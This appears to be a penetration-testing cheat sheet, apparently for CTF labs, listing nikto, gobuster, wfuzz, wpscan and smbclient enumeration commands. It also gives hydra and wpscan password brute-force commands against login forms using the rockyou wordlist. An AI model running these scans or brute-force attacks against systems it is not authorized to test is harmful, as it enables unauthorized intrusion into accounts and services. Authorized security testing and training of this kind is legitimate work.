
https://github.com/gmelodie/awesome-wordlists

### 1. WEB

- __GENERAL INFORMATION__:
```bash
nikto -h 192.168.100.10
```

- __FILE/DIRECTORY__:
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt -u http://localhost
dirsearch -u http://localhost
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://192.168.100.103/gitweb/FUZZ --hc 404,403
```

- __DOMAINS__:
```bash
wfuzz -w /usr/share/wordlists/amass/all.txt -u http://10.10.162.126 -H 'Host: FUZZ.internal.thm' --hl 375
```

- __WORDPRESS__:
```bash
wpscan -U admin --url http://internal.thm/blog -P /usr/share/wordlists/rockyou.txt -T 20
wpscan --url http://internal.thm/blog

INFORMATION DISCLOSURE:
http://internal.thm/blog/index.php/wp-json
http://internal.thm/blog/index.php/wp-json/wp/v2/users 
```

- __LFI__
https://highon.coffee/blog/lfi-cheat-sheet/
https://github.com/emadshanab/LFI-Payload-List

### 2. SMB

```bash
smbmap -H <ip>
smbclient //<ip>/<res>
smbclient //<ip>/<res> -U <DOMAIN>/<USERNAME> --password <PASSWORD>
```

### 3. FTP

```bash
ftp <ip>
```

### 4. CREDENTIAL BRUTEFORCE

```bash
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.104 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password"

sudo hydra -l qiu -P /usr/share/wordlists/rockyou.txt 192.168.100.104 https-post-form "/admin/login.php:password=^PASS^&loginsubmit=Submit:User name or password incorrect"
```
